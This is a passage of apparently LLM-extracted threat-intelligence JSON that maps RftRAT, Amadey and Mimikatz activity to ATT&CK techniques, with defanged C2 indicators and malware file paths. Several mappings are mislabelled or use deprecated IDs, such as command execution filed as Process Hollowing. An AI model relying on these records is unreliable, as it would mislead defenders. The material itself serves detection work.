              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c513f7e3-d9a4-41cd-807b-bd4b4c1bc3da",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "RftRAT communicates with the C&C server to receive commands and send data",
            "confidence_score": 0.675,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "hxxps://prohomepage[.]net/index.php",
              "45.76.93[.]204:56001",
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2100b081-c909-4ce9-862f-dc8cefff85ab",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Info Stealing",
            "attack_id": "T1005",
            "tactic": "Credential Access",
            "description": "Malware for collecting information from web browsers were created in the %ALLUSERSPROFILE%\\semantec\\ path",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\semantec\\GBIA.exe",
              "%ALLUSERSPROFILE%\\semantec\\GBIC.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Info Stealer",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f1596fd1-d7cd-4409-a812-1d234b946839",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "The injector injects ipcheck.dll into the explorer.exe and runtimebroker.exe processes",
            "confidence_score": 0.668,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\semantec\\taskhosts.exe",
              "ipcheck.dll"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit",
              "Injector"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3230d900-4db8-4e99-9ba0-677d99a6f984",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "PowerShell and Metasploit were detected as tools used by the threat actor",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.261,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3019e43e-718e-4079-a914-de6ab0db1d3c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected use of PowerShell and Metasploit for potential malicious command execution",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.238,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "74b28720-2873-4c77-b521-c10966f8b9a1",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution through API",
            "attack_id": "T1106",
            "tactic": "Execution",
            "description": "RftRAT writes the received commands to the path %APPDATA%\\asc\\t1.pb before decrypting them",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4fbb19b9-8cf5-401e-bf27-ef2b98c52649",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "UAC Bypass",
            "attack_id": "T1548.002",
            "tactic": "Privilege Escalation",
            "description": "ICMLuaUtil used to bypass UAC",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ICMLuaUtil"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "ICMLuaUtil",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8489b1d8-530a-4aad-8688-f2251c2997ac",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "RftRAT can receive commands from the C&C server and execute them",
            "confidence_score": 0.66,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RftRAT"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "149ce1a0-45b6-4a74-851c-8921b3439121",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Credential Access",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Mimikatz was detected as a tool used by the threat actor",
            "confidence_score": 0.658,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.238,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mimikatz.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cbd0593e-c074-4ff2-bd9c-23e24f4772af",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "The infected system's information is transmitted to the C&C server",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C&C server"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db44028a-4e54-4510-a0e9-f289b1fc9131",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "The threat actor used RDP for information theft",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RDP Wrapper",
              "3389"
            ],
            "tools": [
              "rundll32",
              "RDP",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "605fc87c-a5f8-406a-b436-e693766c26ff",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.654,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ebedf6e9-5fec-4006-9a60-88bd261e535e",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "Amadey searches for product names from South Korean companies",
            "confidence_score": 0.653,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "product names"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e9b97de9-46e5-4285-bce5-2038925c8e0b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Defensive Evasion",
            "attack_id": "T1112",
            "tactic": "Defensive Evasion",
            "description": "Detected use of Rundll32 for potential malicious code execution",
            "confidence_score": 0.651,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "rundll32.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ca7a0690-519e-4856-87db-205540af3c86",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "Amadey collects system information from the infected system",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system information"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8f219da0-9dcf-46c0-ba3f-0fe0d563a163",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "RftRAT uses specific path names for saving data",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "777df74c-3a69-4432-85a2-75e6c8eecacd",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Credential Access",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected use of Mimikatz for potential credential theft",
            "confidence_score": 0.647,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mimikatz.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2187d828-5a7a-4102-b9a9-a32380c70cf0",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Collection",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Detected use of Keylogger for potential keystroke logging",
            "confidence_score": 0.647,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogger"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b9b61d4a-94fe-4692-9530-fd04d3466beb",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "RftRAT saves C&C communication and command results",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C&C communication"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "520d6192-7c16-4855-9c1a-401a62f27c9f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "AutoIt script used for malicious purposes",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5480018a-cf3b-4aca-a8d0-84fc598e600f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "RftRAT injects into svchost.exe",
            "confidence_score": 0.642,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svchost.exe",
              "RftRAT"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ae2069e2-9203-4288-ad6e-09a28b50f0ad",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b05a63ee-38ea-400d-b467-ed0187ca5896",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a162f56c-5cd4-448f-a441-20bdfe826e6c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Credential Access",
            "description": "RftRAT creates an Infostealer",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Infostealer"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6e7de3a9-24b7-4341-8355-ef640f481b1b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "RftRAT packed in VMP",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VMP"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "31c692b2-6165-4f44-85de-92dd9d3bd1f0",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File Deletion",
            "attack_id": "T1107",
            "tactic": "Defense Evasion",
            "description": "RftRAT can delete files",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0x06"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7536ef67-0d66-465a-9a66-3506e41b8077",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9f06163c-88e1-43b0-9d3b-93d9400d5f4b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a99e9fd1-4d32-4908-817b-01d0ec059bc5",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "45b7406f-f76d-4512-b94a-8a3e6f0cbd05",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "OS Credential Dumping",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected OS Credential Dumping activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a4cc84fa-1597-42db-a68f-47edae9a8d3a",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "099f525e-72b9-46f2-8cbd-8204cedabd18",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "Detected Input Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "2f21ea69-78fd-4536-8791-5f385be08b83",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
